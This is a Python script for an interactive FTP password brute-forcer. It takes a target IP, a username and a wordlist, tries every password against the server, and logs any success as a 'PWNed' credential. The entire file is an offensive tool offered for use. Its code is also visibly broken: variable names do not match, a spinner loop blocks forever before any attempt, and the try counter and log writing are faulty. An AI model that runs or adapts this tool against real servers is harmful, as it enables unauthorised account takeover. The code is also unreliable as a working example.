#!/usr/bin/env python3


import ftplib
import os
import datetime
import sys
import time
import re
import cowsay


# constants, global flag
CWD = os.getcwd()
FTPLOG = os.path.join(CWD, 'ftp_bruteforce.log')
LOGHEADER = '''
*****************************************************
**  FTP Bruteforcer ~ LOGFILE: Successful logins   **
*****************************************************
'''
HEADER = '''
*****************************************************
* ||//-\\|| FTP Bruteforcer ~ by ||//-\\|| *
*****************************************************
'''
FOOTER = '''                                              
                                            0 /  
** |/-\| ¯\_(ツ)_/¯ ~ THE END -\|/-\|/-   - | -  ~  **
                                           / \
'''
isFound = False


# spinning timer
def spin(found=False):
    """Prints spinning timer bar(s), with ARG 'bars' #bars.
    Stops when ARG 'found' (global 'isfound') evaluates to True.
    Default: 10 bars + autostop if NO ARGS given"""

    while True:
        spinner = "\\|/-"

        print("----------\r", end='', flush=True)

        for pos in range(10):
            print("-", end='', flush=True)
            for spin in range(25):
                # break statement here when task completed
                if found:
                    print()
                    return
                time.sleep(0.1)
                print("\b" + spinner[spin % 4], end='', flush=True)
            print("\b*", end='', flush=True)


def main():
    '''Simple interactive (soon with cmdline ARGS) Commandline FTP-Bruteforcer. Connects to known
    FTP-Server with username, and bruteforces login using a selected passwdlist'''
    print(HEADER, "\n")

    try:
        while True:
            SERVER = input("Enter IP-Address of FTP server: ")
            # Regular Expression to check for valid IPv4 Address
            REGEXP_IP = r'^\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}$'
            ip_re = re.compile(REGEXP_IP)
            # valid IP/NOT valid IP Flag
            isIP = ip_re.search(SERVER)

            if isIP:
                print(f"[+] Valid IP-Adress entered: {SERVER}\n")
                break
            else:
                print(f"[-] INVALID IP! Please retry\n")

    except EOFError:
        sys.exit("Exiting script on behalf of user...")

    USER = input("Enter username to brute-force: ")
    print(USER, "\n")

    try:
        PASSWORD_LIST = input(
            "Please provide path and filename of passwordlist: ")
        print(PASSWORD_LIST)

        if os.path.exists(PASSWORD_LIST):
            print(f'*** Starting cracking process... ***\n')
            starttime = time.time()
            print(f'Progress: ')
            spin(isfound)

            with open(passwd_list, 'r') as passwords:
                for password in passwords:
                    password = password.strip()
                    try:
                        tries = 0
                        ftp_con = ftplib.FTP(server, user, password)
                        if ftp_con:
                            isfound = True

                            print(f'''[+] Success! Connected to FTP server {server} with user {user}\
                            and password {password} -- try #{tries})''')

                            endtime = time.time()
                            delta_time = endtime - starttime

                            print(f'[…] Elapsed Time: {delta_time} seconds')

                            CURRENT_TIME = datetime.datetime.now()
                            LOGLINE = f'[+] PWNed! server: {server} with username: {user}\
                            and password {password} (try #{tries} @ {CURRENT_TIME}\n'

                            tries += 1

                            if os.path.exists(FTPLOG):
                                with open(FTPLOG, 'a+') as ftp_log:
                                    ftp_log.write(LOGLINE)
                            else:
                                with open(FTPLOG, 'w+') as ftp_log:
                                    ftp_log.write(LOGHEADER, LOGLINE)
                    except:
                        print(
                            f'still trying... *** password: {password} *** try #{tries}\r', end='')
        else:
            print(f'[-] No Password list exists at your specified location!\n')
            raise FileExistsError
    except FileNotFoundError:
        print(
            f'[-] Sorry. Your password list could not be found at {passwd_list}!')
    except:
        cowsay.trex("SOMETHING WENT REALLY WRONG HERE...")
        print(FOOTER)
        sys.exit()


# to be continued ...
# modify for sys.argv instead (or additionally)!)

# if run as script: run main() program
if __name__ == '__main__':
    main()

# -> Refactor as script with Commandline ARGS and functions incl. main()

# Run as script with ARGS IF ARGS exist AND script NOT imported as module

# if __name__ == '__main__':
#     # if there are ARGS ...
#     if len(sys.argv) > 1:
#         args = [print(f"{x}, ", end='') for x in sys.argv[1:]]
#         main(args)  # run script with ARGS
#     else:
#         main()  # else run without ARGS (default ARGS)
